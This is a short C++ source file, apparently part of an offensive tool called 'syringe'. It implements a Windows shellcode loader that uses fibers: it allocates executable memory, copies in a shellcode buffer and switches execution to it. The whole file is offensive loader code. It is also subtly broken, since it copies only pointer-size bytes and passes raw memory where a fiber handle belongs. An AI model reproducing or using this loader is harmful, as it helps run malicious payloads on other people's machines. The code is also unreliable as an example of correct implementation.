#include "../../includes/shellcode/fiber.hpp"


/*
    *    syringe/shellcode/fiber.cpp
    *    Date: 12/6/21
    *    Author: 0x1CA3
*/


/*  
 * Credits to https://reconshell.com/fiber-injection-windows-fibers-to-execute-shellcode-in-a-local-process/
 * for explaining and giving examples of this technique!
 */

void FiberShellcodeExecution::Execute(char *s) {
    PVOID FiberCreate, fiber, s_s;
    fiber = ConvertThreadToFiber(NULL);
    s_s = VirtualAlloc(0, sizeof(s), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(s_s, s, sizeof(s));
    FiberCreate = CreateFiber(NULL, (LPFIBER_START_ROUTINE)s_s, NULL);
    SwitchToFiber(s_s);
}